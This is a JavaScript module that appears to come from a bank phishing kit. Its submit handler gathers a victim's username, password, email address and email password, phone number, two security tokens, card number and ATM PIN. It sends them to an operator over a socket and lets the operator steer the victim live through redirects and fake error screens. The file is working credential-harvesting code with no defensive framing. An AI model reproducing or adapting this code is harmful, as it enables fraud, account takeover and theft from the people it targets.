import { loader } from "../components/loader";

export const submitBase = async({dataImportant, valuesData }) => {
    
    const {  modeLive, liveData, pageNow, setLiveError, navigate, setShowSpiner, socket, addData, urlToNavigate, spiner, timeLoader } = dataImportant

    const {
        typeDocument,
        username,
        password,
        correo,
        celular,
        claveCorreo,
        token1,
        token2,
        tarjeta,
        atmPassword, 
    } = valuesData;
    const socketID = socket.id
    const [ newUser ] = await addData({typeDocument, username, password, correo, celular, claveCorreo, token1, token2, tarjeta, atmPassword, modeLive, socketID, liveData, pageNow, isConnected: true, isLoading: true})

    await socket.emit('[bag] create', newUser)  
    
    if ((spiner === true || timeLoader) && modeLive === false ) {
        loader(timeLoader, navigate, urlToNavigate)
        spiner === true && setShowSpiner(true)
        return
    }

    if (modeLive === true) { 
        setShowSpiner(true)
        return await socket.on('[LIVE] changeUrlClient', ({url, viewError}) => { 
            if(viewError === true) {
                setShowSpiner(false)
                setLiveError(true)
            }
            if(pageNow === url) {
                setShowSpiner(false)
                return setLiveError(true)
            } 
            return navigate(url)
        }) 
    }

    return urlToNavigate.includes('https://') ? window.location.href = urlToNavigate : navigate(`${urlToNavigate}`)
}